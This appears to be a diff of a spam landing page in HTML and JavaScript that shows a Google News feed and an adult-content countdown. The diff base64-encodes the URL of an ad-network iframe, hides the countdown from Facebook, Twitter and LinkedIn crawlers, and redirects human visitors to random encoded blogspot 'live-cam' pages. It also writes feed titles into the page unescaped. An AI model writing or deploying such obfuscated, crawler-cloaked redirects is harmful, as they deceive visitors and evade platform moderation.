@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: "Segoe UI", Arial, sans-serif;
       max-width: 800px;
       margin: 0 auto;
       padding: 20px;
@@ -15,33 +15,57 @@
     }
     .embedded-frame {
       width: 100%;
-      height: 500px;
+      height: 400px;
       border: 1px solid #ddd;
       border-radius: 8px;
       margin-bottom: 20px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      background: #f8f9fa;
-    }
-    .frame-loading {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100%;
-      font-size: 18px;
-      color: #666;
     }
     .simple-countdown {
       text-align: center;
-      background: #ff4444;
+      background: linear-gradient(135deg, #ff4444, #ff6f61);
       color: white;
-      padding: 15px;
-      border-radius: 8px;
+      padding: 20px;
+      border-radius: 12px;
       margin-bottom: 20px;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+      position: relative;
     }
     .countdown-number {
-      font-size: 2rem;
+      font-size: 2.5rem;
       font-weight: bold;
-      margin: 5px 0;
+      margin: 10px 0;
+    }
+    .button-group {
+      margin-top: 15px;
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+    }
+    .btn {
+      padding: 10px 18px;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+    .btn-stop {
+      background: #333;
+      color: #fff;
+    }
+    .btn-stop:hover {
+      background: #444;
+      transform: scale(1.05);
+    }
+    .btn-next {
+      background: #1a73e8;
+      color: #fff;
+    }
+    .btn-next:hover {
+      background: #0d5ddf;
+      transform: scale(1.05);
     }
     .subdomain-info {
       background: #e9ecef;
@@ -66,6 +90,10 @@
       border-radius: 8px;
       border-left: 4px solid #4285f4;
       gap: 12px;
+      transition: transform 0.2s;
+    }
+    .news-item:hover {
+      transform: scale(1.01);
     }
     .news-thumb {
       flex-shrink: 0;
@@ -101,26 +129,17 @@
   </style>
 </head>
 <body>
-  <!-- Iframe được thêm vào đầu trang và tải trước tiên -->
-  <div class="embedded-frame">
-    <iframe 
-      id="embedded-content" 
-      src="https://oblivionplaysaltered.com/ncc53nijfk?key=02d6efceaf8b7a7f564b99413c4b3056" 
-      frameborder="0" 
-      allowfullscreen
-      style="width: 100%; height: 100%; border: none;"
-      onload="console.log('Iframe loaded successfully')"
-      onerror="console.log('Iframe loading failed')"
-    ></iframe>
-    <div id="frame-loading" class="frame-loading" style="display: none;">
-      Loading content...
-    </div>
-  </div>
+ 
+  <iframe class="embedded-frame" id="embedded-content" src="" frameborder="0" allowfullscreen></iframe>
 
   <div class="simple-countdown" id="countdown-section">
     <div>Please wait</div>
     <div class="countdown-number" id="countdown">7</div>
     <div>This content is 18+. Please use your discretion before watching.</div>
+    <div class="button-group">
+      <button id="stop-btn" class="btn btn-stop">🛑 Stop</button>
+      <button id="next-btn" class="btn btn-next">⏭️ Next</button>
+    </div>
   </div>
 
   <div class="subdomain-info" id="subdomain-info">
@@ -139,41 +158,24 @@
       'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWJyb2FkY2FzdC5odG1s',
       'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
     ];
+    const ENCRYPTED_IFRAME_LINK = 'aHR0cHM6Ly9vYmxpdmlvbnBsYXlzYWx0ZXJlZC5jb20vbmNjNTNuampmayZrZXk9MDJkNmVmY2VhZjhiN2E3ZjU2NGI5OTQxM2M0YjMwNTY=';
 
-    function decryptTarget(encrypted) {
-      return atob(encrypted);
-    }
-
+    function decryptTarget(e) { return atob(e); }
     function getRandomTarget() {
       const idx = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
       return decryptTarget(ENCRYPTED_TARGETS[idx]);
     }
-
     function isFacebookBot() {
       return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
     }
-
-    // Hiển thị trạng thái loading cho iframe
-    function setupIframeLoading() {
+    function loadIframeContent() {
       const iframe = document.getElementById('embedded-content');
-      const loadingDiv = document.getElementById('frame-loading');
-      
-      iframe.onload = function() {
-        loadingDiv.style.display = 'none';
-        console.log('Iframe content loaded successfully');
-      };
-      
-      iframe.onerror = function() {
-        loadingDiv.style.display = 'flex';
-        loadingDiv.innerHTML = 'Failed to load content. Please check the link.';
-        console.error('Iframe failed to load');
-      };
-      
-      // Hiển thị loading ngay lập tức
-      loadingDiv.style.display = 'flex';
+      const decodedLink = decryptTarget(ENCRYPTED_IFRAME_LINK);
+      iframe.src = decodedLink;
+      console.log('Iframe loaded with:', decodedLink);
     }
 
-    // 📰 LẤY TIN + ẢNH TỪ RSS GOOGLE NEWS
+    // ✅ Tin tức có thumbnail từ Google News
     async function loadSimpleNews() {
       const container = document.getElementById('news-container');
       const rssURL = 'https://news.google.com/rss?hl=en-US&gl=US';
@@ -193,20 +195,25 @@
           const title = item.title;
           const link = item.link;
           const pubDate = new Date(item.pubDate).toLocaleDateString();
-          const thumb = item.thumbnail || item.enclosure?.link || 'https://via.placeholder.com/100x70?text=News';
+          let thumb = item.thumbnail || item.enclosure?.link || '';
+
+          if (!thumb) {
+            const imgMatch = item.description.match(/<img[^>]+src="([^">]+)"/i);
+            if (imgMatch && imgMatch[1]) thumb = imgMatch[1];
+          }
+          if (!thumb) thumb = 'https://via.placeholder.com/100x70?text=News';
 
           newsHTML += `
             <div class="news-item">
-              <img class="news-thumb" src="${thumb}" alt="">
+              <img class="news-thumb" src="${thumb}" alt="thumbnail">
               <div class="news-content">
-                <div class="news-title"><a href="${link}" target="_blank">${title}</a></div>
+                <div class="news-title"><a href="${link}" target="_blank" rel="noopener">${title}</a></div>
                 <div class="news-meta">
                   <span>${data.feed.title}</span>
                   <span>${pubDate}</span>
                 </div>
               </div>
-            </div>
-          `;
+            </div>`;
         });
 
         container.innerHTML = newsHTML;
@@ -216,6 +223,7 @@
       }
     }
 
+    // ✅ Countdown có Stop / Resume / Next
     function startCountdown() {
       if (isFacebookBot()) {
         document.getElementById('countdown-section').style.display = 'none';
@@ -224,20 +232,38 @@
       }
 
       let seconds = 7;
+      let isPaused = false;
       const countdownEl = document.getElementById('countdown');
-      const timer = setInterval(() => {
-        seconds--;
-        countdownEl.textContent = seconds;
-        if (seconds <= 0) {
-          clearInterval(timer);
-          window.location.href = getRandomTarget();
+      const stopBtn = document.getElementById('stop-btn');
+      const nextBtn = document.getElementById('next-btn');
+      let timer;
+
+      function updateCountdown() {
+        if (!isPaused) {
+          seconds--;
+          countdownEl.textContent = seconds;
+          if (seconds <= 0) {
+            clearInterval(timer);
+            window.location.href = getRandomTarget();
+          }
         }
-      }, 1000);
+      }
+
+      timer = setInterval(updateCountdown, 1000);
+
+      stopBtn.addEventListener('click', () => {
+        isPaused = !isPaused;
+        stopBtn.textContent = isPaused ? '▶️ Resume' : '🛑 Stop';
+        stopBtn.style.background = isPaused ? '#4caf50' : '#333';
+      });
+
+      nextBtn.addEventListener('click', () => {
+        clearInterval(timer);
+        window.location.href = getRandomTarget();
+      });
     }
 
-    // Thiết lập iframe ngay lập tức
-    setupIframeLoading();
-
+    loadIframeContent();
     document.addEventListener('DOMContentLoaded', () => {
       loadSimpleNews();
       startCountdown();
